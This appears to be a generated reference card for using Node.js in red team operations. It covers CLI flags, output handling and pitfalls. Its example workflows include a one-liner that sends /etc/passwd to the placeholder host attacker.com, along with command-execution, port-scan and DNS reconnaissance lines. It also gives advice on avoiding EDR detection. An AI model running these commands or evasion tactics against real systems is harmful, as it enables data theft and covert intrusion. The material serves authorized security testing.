---
name: Node.js
description: Node.js JavaScript runtime for executing JS-based security tools,
  scripts, and exploits in red team operations
registry: registry
tool_id: nodejs
category: other
tags:
  - javascript
  - runtime
  - scripting
  - execution
  - enumeration
  - exploitation
  - v8
mitre_techniques:
  - T1059.007
summary: Node.js (v24.14.1) is a JavaScript runtime built on Chrome's V8 engine.
  Use it to execute JavaScript-based offensive security tools, run custom
  exploit scripts, or invoke JS payloads. Invoke with `/usr/bin/node script.js`
  or `/usr/bin/node -e "code"` for inline execution. Supports full npm ecosystem
  access for HTTP clients, crypto, file system operations, and network tools.
  Common in red team contexts because it's often present in dev environments,
  can be compiled to standalone executables, and provides non-blocking I/O for
  network operations. Watch for memory limits (default heap size), noisy npm
  package installations, and detection of Node.js processes in environments
  where it's unexpected. Use `-e` flag for one-liners, `--eval` for inline code
  execution, `--require` to preload modules. Outputs to stdout/stderr; handle
  JSON parsing manually. Check version with `node -v`. Node.js activity can
  blend with legitimate development but unusual execution paths or arguments may
  trigger EDR.
sources:
  - http://nodesource.com/blog/how-nodejs-works/
  - https://www.tutorialspoint.com/nodejs/index.htm
  - https://nodejs.org/docs/latest/api/
  - https://medium.com/@gulsaba.fiha/node-js-tutorial-for-beginners-why-its-fast-scalable-and-how-to-use-it-with-express-js-ac792ae3f0a4
  - https://nodejs.org/api/documentation.html
  - https://blog.risingstack.com/mastering-the-node-js-cli-command-line-options/
  - https://nodejs.org/download/test/v15.0.0-test20200429329279fc84/docs/api/cli.html
  - https://nodejs.org/api/cli.html
  - https://www.w3schools.com/nodejs/nodejs_command_line.asp
  - https://docs.contrastsecurity.com/en/command-line-for-node-js.html
  - https://www.sisainfosec.com/blogs/penetration-testing-vs-red-teaming-exercise-understanding-the-key-differences/
  - https://redcanary.com/blog/security-operations/tdr-secops-recap/
generated_at: 2026-05-19T11:15:44.887Z
generated_by: anthropic
source_hash: f20e4c500c72f48eb34451cfe4b8dbb351d2003b00da44be6130ac21dc44ae01
---

# Node.js

## Overview

Node.js is a cross-platform JavaScript runtime built on the V8 engine that enables server-side execution of JavaScript code. In RTPI context, it serves as an execution environment for JavaScript-based offensive security tools, exploit scripts, and network utilities. Node.js provides access to extensive libraries via npm including HTTP/HTTPS clients, crypto primitives, file system access, network sockets, and child process spawning. Its non-blocking, event-driven architecture makes it suitable for high-performance network operations. Adversaries increasingly adopt Node.js because it offers diverse execution patterns (standalone scripts, compiled binaries, inline eval) that can blend with legitimate development activity and evade detections focused on native scripting languages like PowerShell.

## When to use

Use Node.js when you need to execute JavaScript-based security tools or exploits. Invoke it for running reconnaissance scripts that leverage HTTP/HTTPS libraries, executing web application exploit code, running custom network scanners or enumeration tools written in JS, testing API endpoints with full control over headers and payloads, or executing payloads that require JavaScript runtime features. Prefer Node.js over curl/wget when you need complex HTTP logic, cookie handling, WebSocket connections, or crypto operations. It's particularly useful in environments where Node.js is legitimately installed for development purposes, allowing your activity to blend with normal operations. Consider it as an alternative to Python when the target has Node.js but not Python installed.

## Authentication & setup

No authentication required. Node.js is pre-installed at `/usr/bin/node` in this container (v24.14.1). Verify availability with `node -v` or `node --version`. No additional setup needed for basic script execution. For external packages, you would normally use npm, but in red team contexts avoid `npm install` during operations as it creates noisy network traffic, writes to disk, and may trigger alerts. Instead, bundle dependencies with your scripts beforehand or use built-in modules (`http`, `https`, `fs`, `net`, `crypto`, `child_process`, `os`, `dns`) which require no installation. Set `NODE_OPTIONS` environment variable to pass runtime options globally if needed, but command-line flags take precedence.

## Key commands / parameters

Basic execution: `node script.js [arguments]` runs a JavaScript file. Inline execution: `node -e "console.log('code')"` or `node --eval "code"` executes JavaScript directly from command line. Print and exit: `node -p "expression"` or `node --print "expression"` evaluates and prints result. Syntax check: `node -c script.js` or `node --check script.js` validates syntax without execution. REPL mode: `node` with no arguments starts interactive shell. Read from stdin: `node -` reads script from stdin. Version check: `node -v` or `node --version`. Memory control: `node --max-old-space-size=SIZE script.js` sets heap memory limit in MB (useful to avoid OOM). Preload modules: `node --require ./module.js script.js` loads module before script execution. V8 options: `node --v8-options` lists all V8 flags. Disable warnings: Set `NODE_NO_WARNINGS=1` environment variable. Pass arguments to script: `node script.js -- --arg1 value1` where `--` separates Node.js options from script arguments.

## Example workflows

**Inline reconnaissance**: `node -e "require('dns').lookup('target.com',(e,a)=>console.log(a))"` performs DNS lookup. **HTTP enumeration**: Create `enum.js` with `const https=require('https'); https.get('https://target.com/api', r=>{console.log(r.statusCode); r.on('data',d=>process.stdout.write(d))});` then execute `node enum.js`. **Port scanning**: Use `net` module to attempt connections: `node -e "require('net').connect(443,'target.com').on('connect',()=>console.log('open')).on('error',()=>console.log('closed'))"`. **Payload execution**: `node payload.js --target 10.0.0.5 --port 8080` runs custom exploit with arguments. **File exfiltration**: `node -e "require('https').request({host:'attacker.com',method:'POST'},r=>{}).end(require('fs').readFileSync('/etc/passwd'))"` sends file contents. **Process spawning**: `node -e "require('child_process').exec('whoami',(_,o)=>console.log(o))"` executes system commands. **REPL for testing**: Run `node`, then interactively test code snippets before committing to script file.

## Output format

Node.js writes output to stdout and errors to stderr by default. Console methods (`console.log`, `console.error`) format output as strings with newlines. Return values from `-p`/`--print` flag are printed directly. JSON output requires manual serialization: `console.log(JSON.stringify(obj))`. Binary data writes directly to stdout when using `process.stdout.write(buffer)`. Exit codes: 0 for success, non-zero for errors. Uncaught exceptions print stack trace to stderr and exit with code 1. Syntax errors from `--check` print error details to stderr. No structured output format by default; parse stdout as needed. Capture output with standard shell redirection: `node script.js > output.txt 2> errors.txt`. For REPL mode, output is pretty-printed with syntax highlighting.

## Common pitfalls

**Memory limits**: Default heap size may be insufficient for large operations; use `--max-old-space-size` to increase. **Synchronous vs async**: Many Node.js operations are async; forgetting callbacks or promises causes scripts to exit before completion. **Module resolution**: Scripts expect modules in `node_modules` directory or absolute paths; missing dependencies cause runtime errors. **Detection**: Node.js processes may be unexpected in production environments and trigger EDR alerts, especially with unusual command-line patterns like `-e` inline execution. **Network visibility**: HTTP/HTTPS requests from Node.js are often logged and may reveal source IP; consider OPSEC before direct connections to target. **File writes**: Many npm packages write temporary files or logs; avoid operations that leave artifacts. **Error handling**: Unhandled promise rejections may not exit process in older versions; wrap async code in try-catch. **Version differences**: JavaScript features and APIs vary by Node.js version; test scripts against target version when possible. **Stdin blocking**: Using `node -` waits indefinitely for input if stdin isn't piped correctly.

## References

• https://nodejs.org/docs/latest/api/
• https://nodejs.org/api/documentation.html
• https://nodejs.org/api/cli.html
• https://blog.risingstack.com/mastering-the-node-js-cli-command-line-options/
• https://www.w3schools.com/nodejs/nodejs_command_line.asp
• https://www.tutorialspoint.com/nodejs/index.htm
• https://redcanary.com/blog/security-operations/tdr-secops-recap/
